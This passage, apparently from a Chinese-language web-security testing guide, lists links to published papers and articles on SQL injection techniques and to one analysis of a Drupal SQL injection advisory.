- [Victor Chapela："高级SQL注入"](https://www.cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)
- [Chris Anley："更高级的SQL注入"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [David Litchfield："使用SQL注入和推理进行数据挖掘"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Imperva："盲SQL注入"](https://www.imperva.com/lg/lgw.asp?pid=369)
- [PortSwigger："SQL注入速查表"](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Kevin Spett from SPI Dynamics："盲SQL注入"](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf)
- ["ZeQ3uL" (Prathan Phongthiproek)和"Suphot Boonchamnan："超越SQLi：混淆和绕过"](https://www.exploit-db.com/papers/17934/)
- [Adi Kaploun和Eliran Goshen，Check Point威胁情报与研究团队："最新的SQL注入趋势"](https://blog.checkpoint.com/latest-sql-injection-trends/)

### 有关产品中SQL注入漏洞的文档

- [Drupal数据库注释过滤系统SA-CORE-2015-003中SQL注入的剖析](https://www.vanstechelman.eu/content/anatomy-of-the-sql-injection-in-drupals-database-comment-filtering-system-sa-core-2015-003)
